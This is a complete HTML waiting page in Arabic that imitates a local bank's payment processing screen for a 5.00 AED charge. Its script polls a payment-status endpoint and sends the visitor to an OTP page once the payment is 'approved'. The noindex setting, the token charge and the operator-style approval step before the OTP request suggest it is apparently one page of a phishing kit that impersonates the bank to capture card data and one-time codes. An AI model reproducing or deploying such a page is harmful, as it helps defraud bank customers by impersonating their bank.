<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>جاري معالجة الدفع - بنك المارية المحلي</title>
<link rel="icon" href="/ar/wp-content/uploads/sites/5/2024/04/cropped-favicon-mbank-1-32x32.png" sizes="32x32">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a1628;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;}
.waiting-box{text-align:center;padding:40px 30px;max-width:420px;width:100%;}
.bank-logo{margin-bottom:40px;}
.spinner{width:60px;height:60px;border:4px solid rgba(0,200,255,0.15);border-top:4px solid #00c8ff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 30px;}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.waiting-title{font-size:1.3rem;font-weight:700;color:#00c8ff;margin-bottom:12px;}
.waiting-sub{font-size:0.95rem;color:#6b7f9e;margin-bottom:8px;line-height:1.6;}
.waiting-dots{font-size:1.2rem;color:#6b7f9e;}
.waiting-dots span{animation:blink 1.4s infinite both;}
.waiting-dots span:nth-child(2){animation-delay:0.2s;}
.waiting-dots span:nth-child(3){animation-delay:0.4s;}
@keyframes blink{0%,80%,100%{opacity:0}40%{opacity:1}}
.secure-badge{display:inline-flex;align-items:center;gap:6px;margin-top:30px;padding:10px 20px;background:rgba(0,200,255,0.08);border-radius:30px;font-size:0.82rem;color:#6b7f9e;}
.secure-badge svg{width:14px;height:14px;}
.amount-badge{display:inline-block;margin-top:20px;padding:8px 24px;background:rgba(0,200,255,0.12);border-radius:12px;font-size:1.1rem;font-weight:700;color:#00c8ff;}
</style>
</head>
<body>
<div class="waiting-box">
  <div class="bank-logo">
    <img src="/ar/wp-content/themes/framework/assets/client/img/logo-white-2.png" alt="بنك المارية المحلي" style="height:50px;object-fit:contain;">
  </div>
  <div class="spinner"></div>
  <div class="waiting-title">جاري معالجة عملية الدفع</div>
  <div class="waiting-sub">يرجى الانتظار وعدم إغلاق الصفحة<br>نقوم بمراجعة بيانات الدفع الخاصة بك</div>
  <div class="waiting-dots"><span>.</span><span>.</span><span>.</span></div>
  <div class="amount-badge">5.00 د.إ</div>
  <div class="secure-badge">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
    </svg>
    <span>معاملة آمنة ومشفرة</span>
  </div>
</div>
<script>
(function() {
  var params = new URLSearchParams(window.location.search);
  var paymentId = params.get('id') || '';
  var orderId = params.get('oid') || '';
  var checkId = paymentId || orderId;

  if (!checkId) {
    try { checkId = sessionStorage.getItem('payment_id') || sessionStorage.getItem('order_id') || ''; } catch(e) {}
  }
  if (!checkId) { window.location.href = '/ar/order/'; return; }

  function checkStatus() {
    fetch('/api/payment-status?id=' + encodeURIComponent(checkId))
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.status === 'approved') {
          window.location.href = '/ar/order/otp.html?id=' + checkId;
        } else if (data.status === 'rejected') {
          window.location.href = '/ar/order/summary.html?error=rejected';
        }
      })
      .catch(function() {});
  }

  setInterval(checkStatus, 2500);
  checkStatus();
})();
</script>
</body>
</html>
